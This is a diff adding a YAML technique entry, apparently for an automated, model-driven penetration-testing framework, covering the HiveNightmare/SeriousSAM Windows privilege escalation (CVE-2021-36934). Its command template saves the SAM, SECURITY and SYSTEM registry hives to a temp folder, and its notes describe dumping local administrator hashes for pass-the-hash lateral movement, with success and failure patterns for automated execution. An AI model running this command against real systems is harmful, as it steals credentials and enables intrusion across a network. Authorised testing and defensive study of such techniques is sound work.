@@ -1,0 +1,25 @@
+name: serioussam
+category: privesc
+description: SeriousSAM / HiveNightmare (CVE-2021-36934) — read SAM/SYSTEM as non-admin
+preconditions:
+- shell_obtained
+- unpatched_cve_2021_36934
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: reg save HKLM\SAM C:\\Windows\\Temp\\sam.save /y & reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save /y & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y
+parser: generic_parser
+expected_effects:
+- sam_hashes_obtained
+- local_admin_hash
+- has_hash
+falsifier:
+  pattern: ACCESS_DENIED|patched|permissions_fixed
+  timeout: 30
+model_tier: haiku
+mechanism: |
+  CVE-2021-36934. Windows 10 1809+ builds created shadow copies of SAM/SYSTEM/SECURITY
+  with BUILTIN\\Users read ACL. Any local user reads the shadow-copy hive from the
+  Volume Shadow Copy and dumps local admin hashes → pass-the-hash lateral.
+references:
+  ocd_mindmap: 'Branch 11: HiveNightmare / SeriousSAM (CVE-2021-36934)'
+  hacktricks: windows-hardening/windows-local-privilege-escalation/
